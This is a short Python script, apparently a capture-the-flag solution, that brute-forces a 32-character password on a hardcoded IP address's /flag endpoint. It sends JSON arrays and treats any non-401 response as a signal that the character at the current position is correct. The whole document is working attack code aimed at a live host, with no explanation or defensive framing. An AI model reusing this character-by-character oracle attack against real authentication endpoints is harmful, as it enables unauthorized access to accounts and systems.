import json
import requests

url = "http://34.146.80.178:8002/flag"

password = [[]]*32

for i in range(32):
    for j in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ":
        password[i] = j
        data = {"pass":password}
        headers = {"Content-Type":"application/json"}
        response = requests.post(url, data=json.dumps(data), headers=headers)
        if response.status_code != 401:
            if i == 31:
                print("".join(password))
                print(response.text)
            break